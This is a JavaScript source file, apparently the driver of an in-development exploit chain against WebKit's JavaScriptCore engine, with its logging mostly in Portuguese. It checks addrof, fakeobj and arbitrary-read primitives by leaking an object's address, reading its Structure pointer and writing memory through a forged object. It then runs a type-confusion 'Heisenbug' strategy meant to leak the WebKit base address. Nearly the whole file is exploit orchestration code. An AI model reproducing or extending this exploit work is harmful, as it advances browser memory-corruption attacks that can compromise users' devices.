// js/main.mjs

import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './script3/testArrayBufferVictimCrash.mjs';
import { AdvancedInt64, setLogFunction } from './utils.mjs';
import { JSC_OFFSETS } from './config.mjs';
import { addrof_core, initCoreAddrofFakeobjPrimitives, arb_read, fakeobj_core } from './core_exploit.mjs'; // Importar fakeobj_core

// --- Local DOM Elements Management ---
const elementsCache = {};

function getElementById(id) {
    if (elementsCache[id] && document.body.contains(elementsCache[id])) {
        return elementsCache[id];
    }
    const element = document.getElementById(id);
    if (element) {
        elementsCache[id] = element;
    }
    return element;
}

// --- Local Logging Functionality (formerly from logger.mjs and s3_utils.mjs) ---
const outputDivId = 'output-advanced';

// Local log function that will be passed to modules
export const log = (message, type = 'info', funcName = '') => {
    const outputDiv = getElementById(outputDivId);
    if (!outputDiv) {
        console.error(`Log target div "${outputDivId}" not found. Message: ${message}`);
        return;
    }
    try {
        const timestamp = `[${new Date().toLocaleTimeString()}]`;
        const prefix = funcName ? `[${funcName}] ` : '';
        const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
        const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation', 'tool', 'debug'].includes(type) ? type : 'info';

        if (outputDiv.innerHTML.length > 600000) {
            const lastPart = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 300000);
            outputDiv.innerHTML = `<span class="log-info">[${new Date().toLocaleTimeString()}] [Log Truncado...]</span>\n` + lastPart;
        }

        outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
        outputDiv.scrollTop = outputDiv.scrollHeight;
    } catch (e) {
        console.error(`Error in logToDiv for ${outputDivId}:`, e, "Original message:", message);
        if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`;
    }
};

// --- Local Pause Functionality (formerly from utils.mjs and s3_utils.mjs) ---
const SHORT_PAUSE = 50;
const MEDIUM_PAUSE = 500;
const LONG_PAUSE = 1000;

const PAUSE = async (ms = SHORT_PAUSE) => {
    return new Promise(resolve => setTimeout(resolve, ms));
};

// --- JIT Behavior Test ---
async function testJITBehavior() {
    log("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior');
    let test_buf = new ArrayBuffer(16);
    let float_view = new Float64Array(test_buf);
    let uint32_view = new Uint32Array(test_buf);
    let some_obj = { a: 1, b: 2 };

    log("Escrevendo um objeto em um Float64Array...", 'info', 'testJITBehavior');
    float_view[0] = some_obj;

    const low = uint32_view[0];
    const high = uint32_view[1];
    const leaked_val = new AdvancedInt64(low, high);

    log(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor completo: ${leaked_val.toString(true)})`, 'leak', 'testJITBehavior');

    if (high === 0x7ff80000 && low === 0) {
        log("CONFIRMADO: O JIT converteu o objeto para NaN, como esperado.", 'good', 'testJITBehavior');
    } else {
        log("INESPERADO: O JIT não converteu para NaN. O comportamento é diferente do esperado.", 'warn', 'testJITBehavior');
    }
    log("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior');
}

// --- NOVO: Teste Isolado da Primitiva addrof_core e fakeobj_core com objeto simples ---
async function testIsolatedAddrofFakeobjCore(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME = 'testIsolatedAddrofFakeobjCore';
    logFn(`--- Iniciando Teste Isolado da Primitiva addrof_core / fakeobj_core e leitura de Structure* de objeto simples ---`, 'test', FNAME);

    let addrof_success = false;
    let fakeobj_success = false;
    let rw_test_on_fakeobj_success = false;

    try {
        logFn(`Inicializando primitivas addrof/fakeobj.`, 'info', FNAME);
        initCoreAddrofFakeobjPrimitives();
        await pauseFn(SHORT_PAUSE);

        // --- Teste addrof_core ---
        const test_object_original = { p1: 0x11223344, p2: "Hello World", p3: [1, 2, 3] };
        logFn(`Criado objeto de teste original: ${JSON.stringify(test_object_original)}`, 'info', FNAME);
        await pauseFn(SHORT_PAUSE);

        logFn(`Obtendo endereço do objeto de teste original usando addrof_core...`, 'info', FNAME);
        const object_addr = addrof_core(test_object_original);
        logFn(`Endereço retornado por addrof_core (untagged): ${object_addr.toString(true)}`, 'leak', FNAME);

        if (object_addr.equals(AdvancedInt64.Zero) || object_addr.equals(AdvancedInt64.NaNValue)) {
            logFn(`ERRO: addrof_core retornou endereço inválido para test_object_original.`, 'error', FNAME);
            throw new Error("addrof_core returned invalid address.");
        }
        addrof_success = true; // Se chegou aqui, addrof retornou um valor untagged.
        await pauseFn(SHORT_PAUSE);

        // Tentativa de ler o ponteiro da Structure* no offset 0x8 (JSCell::STRUCTURE_POINTER_OFFSET)
        logFn(`Tentando ler ponteiro da Structure* no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do objeto original...`, 'info', FNAME);
        const structure_ptr_addr = object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
        const structure_ptr_val = await arb_read(structure_ptr_addr, 8); // Requer arb_read funcional
        logFn(`Valor lido no offset da Structure* do objeto original: ${structure_ptr_val.toString(true)}`, 'leak', FNAME);

        if (structure_ptr_val.equals(AdvancedInt64.Zero) || structure_ptr_val.equals(AdvancedInt64.NaNValue)) {
            logFn(`ALERTA: Ponteiro da Structure* lido como zero/NaN para objeto original. Isso pode indicar untagging incorreto ou offset da Structure errado para este tipo de objeto.`, 'warn', FNAME);
            // Continuar mesmo com alerta, para testar fakeobj
        } else {
            logFn(`SUCESSO PARCIAL: Leitura do possível ponteiro da Structure* (${structure_ptr_val.toString(true)}) não é zero/NaN.`, 'good', FNAME);
        }
        await pauseFn(SHORT_PAUSE);


        // --- Teste fakeobj_core ---
        logFn(`Tentando criar um objeto falsificado (fakeobj) no endereço do objeto original...`, 'info', FNAME);
        // O endereço do fakeobj deve ser o endereço untagged do objeto original.
        const faked_object = fakeobj_core(object_addr);
        logFn(`Objeto falsificado criado: ${faked_object} (typeof: ${typeof faked_object})`, 'leak', FNAME);

        if (faked_object === undefined || faked_object === null || typeof faked_object !== 'object') {
            logFn(`ERRO: fakeobj_core retornou um valor inválido ou não-objeto. Isso pode indicar uma tag incorreta ou corrupção.`, 'error', FNAME);
            throw new Error("fakeobj_core returned invalid object.");
        }
        fakeobj_success = true; // Se chegou aqui, fakeobj retornou um objeto JS.
        await pauseFn(SHORT_PAUSE);

        // Tentar ler uma propriedade do objeto original através do objeto falsificado
        // O offset 0x10 (BUTTERFLY_OFFSET) é onde as propriedades in-line começam para JSObjects simples.
        logFn(`Tentando ler a propriedade 'p1' (esperado no offset 0x${JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET.toString(16)}) do objeto original através do fakeobj...`, 'info', FNAME);
        let read_val_from_fakeobj = null;
        try {
            read_val_from_fakeobj = faked_object.p1;
            logFn(`Valor da propriedade 'p1' lido via fakeobj: ${read_val_from_fakeobj} (esperado ${test_object_original.p1})`, 'leak', FNAME);
            if (read_val_from_fakeobj === test_object_original.p1) {
                logFn(`SUCESSO: Leitura da propriedade 'p1' via fakeobj CORRETA. As primitivas addrof/fakeobj estão FUNCIONANDO para este tipo de objeto!`, 'good', FNAME);
                rw_test_on_fakeobj_success = true;
            } else {
                logFn(`FALHA: Leitura da propriedade 'p1' via fakeobj INCORRETA. Lido: ${read_val_from_fakeobj}, Esperado: ${test_object_original.p1}.`, 'error', FNAME);
            }
        } catch (e_read_prop) {
            logFn(`ERRO ao ler propriedade 'p1' via fakeobj: ${e_read_prop.message}. Isso pode indicar que o fakeobj não é válido.`, 'error', FNAME);
        }
        await pauseFn(SHORT_PAUSE);

        // Tentar escrever uma propriedade no objeto original através do objeto falsificado
        const new_val_for_p1 = 0xDEADBEEF;
        logFn(`Tentando escrever 0x${new_val_for_p1.toString(16)} na propriedade 'p1' do objeto original via fakeobj...`, 'info', FNAME);
        try {
            faked_object.p1 = new_val_for_p1;
            logFn(`Valor escrito na propriedade 'p1' via fakeobj. Verificando o objeto original...`, 'info', FNAME);
            if (test_object_original.p1 === new_val_for_p1) {
                logFn(`SUCESSO: Escrita na propriedade 'p1' via fakeobj CORRETA. O objeto original foi modificado!`, 'good', FNAME);
                rw_test_on_fakeobj_success = true; // Reinforce success
            } else {
                logFn(`FALHA: Escrita na propriedade 'p1' via fakeobj INCORRETA. Valor no original: ${test_object_original.p1}, Esperado: ${new_val_for_p1}.`, 'error', FNAME);
            }
        } catch (e_write_prop) {
            logFn(`ERRO ao escrever propriedade 'p1' via fakeobj: ${e_write_prop.message}. Isso pode indicar que o fakeobj não é válido.`, 'error', FNAME);
        }
        await pauseFn(SHORT_PAUSE);


    } catch (e) {
        logFn(`ERRO CRÍTICO no teste isolado de addrof/fakeobj_core: ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME);
        // Não é um sucesso se qualquer erro crítico ocorrer
        addrof_success = false;
        fakeobj_success = false;
        rw_test_on_fakeobj_success = false;
    } finally {
        logFn(`--- Teste Isolado da Primitiva addrof_core / fakeobj_core Concluído (Addrof: ${addrof_success}, Fakeobj Criação: ${fakeobj_success}, Leitura/Escrita via Fakeobj: ${rw_test_on_fakeobj_success}) ---`, 'test', FNAME);
    }
    return addrof_success && fakeobj_success && rw_test_on_fakeobj_success;
}


// --- Main Heisenbug Reproduction Strategy ---
async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43";
    log(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43(log, PAUSE, JSC_OFFSETS);

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        log(`  RUNNER R43(L): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        log(`  RUNNER R43(L): Completou. Melhor OOB usado: ${result.oob_value_of_best_result || 'N/A'}`, "good", FNAME_RUNNER);
        log(`  RUNNER R43(L): Detalhes Sonda TC (Best): ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak", FNAME_RUNNER);

        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result;
        const addrofResult = result.addrof_result;
        const webkitLeakResult = result.webkit_leak_result;

        log(`  RUNNER R43(L): Heisenbug TC Sonda (Best): ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln" : "warn", FNAME_RUNNER);

        if (addrofResult) {
            log(`  RUNNER R43(L): Teste Addrof (Best): ${addrofResult.msg} (Endereço vazado: ${addrofResult.leaked_object_addr || addrofResult.leaked_object_addr_candidate_str || 'N/A'})`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            log(`  RUNNER R43(L): Teste Addrof não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult) {
            log(`  RUNNER R43(L): Teste WebKit Base Leak (Best): ${webkitLeakResult.msg} (Base Candidata: ${webkitLeakResult.webkitBaseAddress || 'N/A'}, Ponteiro Interno Etapa2: ${webkitLeakResult.internal_ptr_stage2 || 'N/A'})`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            log(`  RUNNER R43(L): Teste WebKit Base Leak não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult?.success) {
            document.title = `${module_name_for_title}_R43L: WebKitLeak SUCCESS!`;
        } else if (addrofResult?.success) {
            document.title = `${module_name_for_title}_R43L: Addrof OK, WebKitLeak Fail`;
        } else if (heisenbugSuccessfullyDetected) {
            document.title = `${module_name_for_title}_R43L: TC OK, Addrof/WebKitLeak Fail`;
        } else {
            document.title = `${module_name_for_title}_R43L: No TC Confirmed`;
        }
    } else {
        document.title = `${module_name_for_title}_R43L: Invalid Result Obj`;
    }
    log(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE(MEDIUM_PAUSE);
    log(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}


// --- Initialization Logic ---
function initializeAndRunTest() {
    const runBtn = getElementById('runIsolatedTestBtn');
    const outputDiv = getElementById('output-advanced');

    // Set the log function in utils.mjs so core_exploit.mjs can use it
    setLogFunction(log);

    if (!outputDiv) {
        console.error("DIV 'output-advanced' not found. Log will not be displayed on the page.");
    }

    if (runBtn) {
        runBtn.addEventListener('click', async () => {
            if (runBtn.disabled) return;
            runBtn.disabled = true;

            if (outputDiv) {
                outputDiv.innerHTML = ''; // Clear previous logs
            }
            console.log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject...");
            log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject...", 'test');

            try {
                // Execute JIT test first
                await testJITBehavior();
                await PAUSE(MEDIUM_PAUSE); // Pause to read JIT test log

                // NOVO: Teste isolado das primitivas addrof_core e fakeobj_core
                const addrof_fakeobj_test_passed = await testIsolatedAddrofFakeobjCore(log, PAUSE, JSC_OFFSETS);
                if (!addrof_fakeobj_test_passed) {
                    log("Teste isolado das primitivas addrof_core/fakeobj_core falhou. Isso é crítico para a exploração. Abortando a cadeia principal.", 'critical');
                    runBtn.disabled = false;
                    return;
                }
                log("Teste isolado das primitivas addrof_core/fakeobj_core concluído com sucesso. Prosseguindo para a cadeia principal.", 'good');
                await PAUSE(LONG_PAUSE); // Pausa mais longa para revisar logs do teste addrof/fakeobj

                // Then run the main exploit strategy
                await runHeisenbugReproStrategy_TypedArrayVictim_R43();
            } catch (e) {
                console.error("Critical error during isolated test execution:", e);
                log(`[CRITICAL TEST ERROR] ${String(e.message).replace(/</g, "&lt;").replace(/>/g, "&gt;")}\n`, 'critical');
            } finally {
                console.log("Isolated test concluded.");
                log("Isolated test finished. Check the console for more details, especially if the browser crashed or a RangeError occurred.\n", 'test');
                runBtn.disabled = false;
                if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK") && !document.title.includes("Confirmed")) {
                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43L Done`;
                }
            }
        });
    } else {
        console.error("Button 'runIsolatedTestBtn' not found.");
    }
}

// Ensure DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeAndRunTest);
} else {
    initializeAndRunTest();
}
